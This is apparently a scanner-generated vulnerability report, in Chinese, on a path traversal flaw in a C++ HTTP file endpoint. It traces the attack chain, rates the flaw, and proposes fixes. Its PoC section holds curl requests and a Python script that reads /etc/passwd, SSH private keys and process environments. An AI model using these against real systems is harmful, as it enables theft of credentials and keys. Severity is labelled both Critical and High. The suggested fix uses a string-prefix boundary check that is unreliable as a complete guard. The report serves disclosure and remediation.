# VULN-DF-FC-001: HTTP 文件接口未过滤路径遍历参数，攻击者可读取服务器任意文件

**严重性**: Critical | **CWE**: CWE-22 (Path Traversal) | **置信度**: 85/100
**位置**: `src/file_cache.cpp:10-11` @ `FileCache::readTextFile`

---

## 1. 漏洞细节

该漏洞存在于 `FileCache::readTextFile` 函数中。HTTP 路由 `GET /files` 接收用户通过查询字符串提供的 `name` 参数，将其直接与基础目录 `baseDir_`（值为 `"data"`）拼接构造文件路径，然后使用 `std::ifstream` 打开该文件并将内容作为 HTTP 响应体返回。

**漏洞成因**：整个数据流路径中不存在任何路径安全校验机制：

- 未检查 `../` 目录遍历序列
- 未调用 `realpath()` 或 `std::filesystem::canonical()` 进行路径规范化
- 未对文件名进行白名单或黑名单过滤
- 未验证最终解析路径是否仍在 `baseDir_` 目录范围内

**触发机制**：攻击者发送 `GET /files?name=../../etc/passwd` 请求，服务端拼接后路径为 `data/../../etc/passwd`，操作系统将其解析为 `/etc/passwd`，文件内容被完整返回给攻击者。

**关键代码逻辑**：`main.cpp:55` 从 HTTP 请求中提取 `name` 参数后，在 `main.cpp:58` 直接传入 `readTextFile()`，而 `file_cache.cpp:11` 仅做简单字符串拼接 `baseDir_ + "/" + name`，没有任何防御措施。

## 2. 漏洞代码

**文件**: `src/file_cache.cpp` (行 10-19)

```cpp
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // ← 漏洞点：name 未经验证直接拼接路径
  if (!file) {
    throw std::runtime_error("file not found");
  }

  std::ostringstream data;
  data << file.rdbuf();    // 读取文件全部内容
  return data.str();        // 返回给调用者（最终作为 HTTP 响应体）
}
```

**文件**: `src/main.cpp` (行 54-62) — 路由处理函数

```cpp
server.route("GET", "/files", [&](const HttpRequest& request) {
  std::string name = queryValue(request, "name");  // ← 从查询字符串提取用户输入
  audit.event("anonymous", "read-file", name);
  try {
    return text(200, files.readTextFile(name));     // ← 直接传入 readTextFile，无校验
  } catch (const std::exception& ex) {
    return text(404, std::string("error=") + ex.what() + "\n");
  }
});
```

**文件**: `src/main.cpp` (行 31) — baseDir_ 初始化

```cpp
FileCache files("data");  // baseDir_ = "data"，但字符串拼接无法限制路径范围
```

**代码分析**：

1. `main.cpp:55`：`queryValue()` 从 HTTP 请求的查询字符串中提取 `name` 参数值，该值完全由攻击者控制。
2. `main.cpp:56`：审计日志记录了访问事件，但不构成任何安全防御。
3. `main.cpp:58`：将未经验证的 `name` 直接传入 `files.readTextFile(name)`。
4. `file_cache.cpp:11`：执行 `baseDir_ + "/" + name` 字符串拼接。当 `name = "../../etc/passwd"` 时，拼接结果为 `"data/../../etc/passwd"`，操作系统路径解析将其规范化为 `/etc/passwd`。
5. `file_cache.cpp:16-18`：文件内容被完整读入字符串并返回，最终通过 HTTP 响应发送给攻击者。

## 3. 完整攻击链路

```
[入口点] recv()@src/http_server.cpp:113
  ↓ 接收原始 HTTP 请求数据（如 "GET /files?name=../../etc/passwd HTTP/1.1\r\n..."）
[解析请求] parseRequest()@src/http_server.cpp:42
  ↓ 从请求行提取 target="/files?name=../../etc/passwd"，分离 path 和 query
[解析查询] parseQuery()@src/http_server.cpp:19
  ↓ 按 '&' 和 '=' 分割查询字符串，得到 {"name": "../../etc/passwd"}
[路由分发] handlers_.find()@src/http_server.cpp:120
  ↓ 匹配 "GET /files" 路由，调用对应的 lambda 处理函数
[提取参数] queryValue(request, "name")@src/main.cpp:55
  ↓ 返回攻击者控制的字符串 "../../etc/passwd"
[调用文件读取] files.readTextFile(name)@src/main.cpp:58
  ↓ 将未经验证的 name 传入 FileCache::readTextFile
[路径拼接] baseDir_ + "/" + name@src/file_cache.cpp:11
  ↓ 拼接为 "data/../../etc/passwd"，操作系统解析为 "/etc/passwd"
[漏洞触发] std::ifstream file(...)@src/file_cache.cpp:11
  ↓ 成功打开 /etc/passwd，读取全部内容
[数据泄露] text(200, ...)@src/main.cpp:58 → serializeResponse()@src/http_server.cpp:71
  ↓ 文件内容作为 HTTP 200 响应体返回给攻击者
[响应发送] send(client, ...)@src/http_server.cpp:131
  ↓ 攻击者收到 /etc/passwd 的完整内容
```

**链路可达性验证**：

- `recv()` 在 `http_server.cpp:113` 监听 TCP 端口（默认 8080），接受任意网络连接
- `parseRequest()` 无输入过滤，直接将查询字符串传递给 `parseQuery()`
- `parseQuery()` 仅做简单的字符串分割，不进行 URL 解码（但 `../` 无需编码即可在查询字符串中传输）
- `GET /files` 路由无需任何认证（与 `POST /login` 不同，后者需要凭据验证）
- 从 `recv()` 到 `ifstream` 的完整路径上不存在任何条件分支或安全检查可以阻断攻击

## 4. 攻击场景

**攻击者画像**: 远程未认证用户。攻击者只需能够与目标服务器的 HTTP 端口建立 TCP 连接即可发起攻击，无需任何凭据或预先认证。

**攻击向量**: 网络 HTTP 请求。通过向 `GET /files` 端点发送包含路径遍历 payload 的查询字符串参数。

**利用难度**: 低

### 攻击步骤

1. **侦察**: 攻击者发现目标服务器运行在 TCP 端口 8080（默认端口），提供 HTTP 服务。
2. **构造请求**: 攻击者构造包含路径遍历 payload 的 HTTP GET 请求：`GET /files?name=../../etc/passwd`
3. **发送请求**: 使用 `curl`、`wget` 或任何 HTTP 客户端发送请求。
4. **获取数据**: 服务器返回 HTTP 200 响应，响应体包含 `/etc/passwd` 的完整内容。
5. **扩大利用**: 攻击者可替换目标文件路径，读取任意敏感文件（如 `/etc/shadow`、应用配置文件、SSH 私钥等）。

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | TCP 端口可达   | 攻击者需能与目标服务器的 HTTP 端口（默认 8080）建立 TCP 连接。服务器绑定 `INADDR_ANY`，监听所有网络接口。 |
| 认证要求   | 无需认证       | `GET /files` 路由无任何认证机制，匿名访问即可触发漏洞。审计日志记录为 "anonymous"。        |
| 配置依赖   | 无特殊配置     | 漏洞存在于默认代码路径中，无需特殊编译选项或运行时配置即可利用。                           |
| 环境依赖   | 标准 Linux 环境 | 漏洞在标准 Linux/Unix 文件系统上均可利用。`../` 路径遍历在所有 POSIX 兼容系统上有效。      |
| 时序条件   | 无             | 不存在竞态条件或时序依赖，单次请求即可触发。                                               |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                         |
| -------- | ---- | -------------------------------------------------------------------------------------------- |
| 机密性   | 高   | 攻击者可读取服务器文件系统中的任意文件（受限于进程权限），包括 `/etc/passwd`、`/etc/shadow`（若进程有权限）、应用配置文件、数据库凭据、SSH 私钥等敏感信息。 |
| 完整性   | 低   | 该漏洞为只读操作（`std::ifstream`），不直接修改文件。但泄露的配置信息（如数据库密码、API 密钥）可能被用于后续攻击，间接影响系统完整性。 |
| 可用性   | 低   | 正常情况下不会导致服务中断。但如果读取特殊文件（如 `/dev/zero`）可能导致响应体过大，消耗内存和带宽资源。 |

**影响范围**: 服务器进程权限范围内的所有文件。如果服务以 root 权限运行（不推荐但可能），则可读取系统上的所有文件。影响范围可扩展至整个服务器——泄露的凭据和配置信息可能被用于横向移动和权限提升。

**CVSS 3.1 估算**: 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
- 攻击向量(AV): 网络
- 攻击复杂度(AC): 低
- 所需权限(PR): 无
- 用户交互(UI): 无
- 范围(S): 未改变
- 机密性(C): 高
- 完整性(I): 无
- 可用性(A): 无

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用，未经授权不得用于非授权系统。

### PoC 1: 使用 curl 读取 /etc/passwd

```bash
# 读取系统密码文件
curl -v "http://<TARGET_IP>:8080/files?name=../../etc/passwd"
```

**预期输出**:
```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: <size>
Connection: close

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### PoC 2: 读取应用自身配置文件

```bash
# 读取 CMakeLists.txt（验证可读取项目文件）
curl "http://<TARGET_IP>:8080/files?name=../CMakeLists.txt"
```

### PoC 3: 使用 Python 脚本批量探测敏感文件

```python
#!/usr/bin/env python3
"""
路径遍历漏洞 PoC - 仅供安全测试使用
用法: python3 poc.py <target_ip> [port]
"""
import sys
import socket

def exploit(host, port, filepath):
    """发送路径遍历请求读取指定文件"""
    # 构造足够多的 ../ 以确保到达根目录
    traversal = "../" * 10 + filepath.lstrip("/")
    request = (
        f"GET /files?name={traversal} HTTP/1.1\r\n"
        f"Host: {host}:{port}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    try:
        sock.connect((host, port))
        sock.sendall(request.encode())

        response = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk

        # 分离 HTTP 头和响应体
        parts = response.split(b"\r\n\r\n", 1)
        if len(parts) == 2:
            header, body = parts
            status_line = header.split(b"\r\n")[0].decode()
            print(f"[{status_line}] {filepath}")
            if b"200" in header.split(b"\r\n")[0]:
                print(body.decode(errors="replace"))
                return True
            else:
                print(f"  -> 文件不存在或无法读取")
                return False
    except Exception as e:
        print(f"[ERROR] {e}")
        return False
    finally:
        sock.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

    targets = [
        "/etc/passwd",
        "/etc/hostname",
        "/etc/os-release",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
    ]

    print(f"[*] 目标: {host}:{port}")
    print(f"[*] 路径遍历 PoC - 仅供安全测试使用\n")

    for target in targets:
        print(f"--- 尝试读取: {target} ---")
        exploit(host, port, target)
        print()
```

**使用说明**:

1. 确保目标服务器正在运行且端口可达
2. 执行 `curl` 命令或 Python 脚本
3. 如果返回 HTTP 200 且响应体包含目标文件内容，则漏洞确认存在

**预期结果**: 服务器返回 HTTP 200 响应，响应体包含所请求文件的完整内容。对于 `/etc/passwd`，应看到系统用户列表。

## 8. 验证环境搭建

### 基础环境

- **操作系统**: 任意 Linux 发行版（Ubuntu 20.04+、Debian 11+、CentOS 8+ 等）
- **编译器**: GCC 9+ 或 Clang 10+（需支持 C++17）
- **构建工具**: CMake 3.16+
- **依赖**: 无外部依赖，仅使用 C++ 标准库和 POSIX socket API

### 构建步骤

```bash
# 克隆/获取项目源码
cd /scan/project

# 创建构建目录
mkdir -p build && cd build

# 配置和编译
cmake .. -DCMAKE_BUILD_TYPE=Debug
make -j$(nproc)
```

### 运行配置

```bash
# 创建数据目录（baseDir_ = "data"）
mkdir -p /scan/project/data
echo "test-content" > /scan/project/data/test.txt

# 启动服务器（默认端口 8080）
./build/edge-gateway 8080
```

### 验证步骤

1. 启动 `edge-gateway` 服务器：`./build/edge-gateway 8080`
2. 在另一终端执行正常请求验证服务可用：`curl http://127.0.0.1:8080/files?name=test.txt`，应返回 `test-content`
3. 发送路径遍历请求：`curl "http://127.0.0.1:8080/files?name=../../etc/passwd"`
4. 观察响应内容

### 预期结果

- **步骤 2**: 返回 HTTP 200，响应体为 `test-content`（正常行为）
- **步骤 3**: 返回 HTTP 200，响应体包含 `/etc/passwd` 的完整内容（漏洞触发）
- 如果 `data` 目录层级不足以遍历到根目录，可增加 `../` 的数量，例如 `name=../../../../../../etc/passwd`

---

## 修复建议

1. **路径规范化与边界检查**（推荐方案）：
   ```cpp
   #include <filesystem>
   
   std::string FileCache::readTextFile(const std::string& name) const {
     namespace fs = std::filesystem;
     fs::path requested = fs::weakly_canonical(fs::path(baseDir_) / name);
     fs::path base = fs::weakly_canonical(baseDir_);
     
     // 确保请求路径在 baseDir_ 范围内
     if (requested.string().find(base.string()) != 0) {
       throw std::runtime_error("access denied: path traversal detected");
     }
     
     std::ifstream file(requested);
     // ...
   }
   ```

2. **输入验证**：拒绝包含 `..`、`/`（开头）、`\` 等危险字符的 `name` 参数。

3. **白名单机制**：仅允许预定义的文件名列表，拒绝所有其他输入。

4. **最小权限原则**：确保服务进程以最低权限用户运行，限制可读取的文件范围。

5. **添加认证**：为 `GET /files` 路由添加身份认证机制，防止未授权访问。
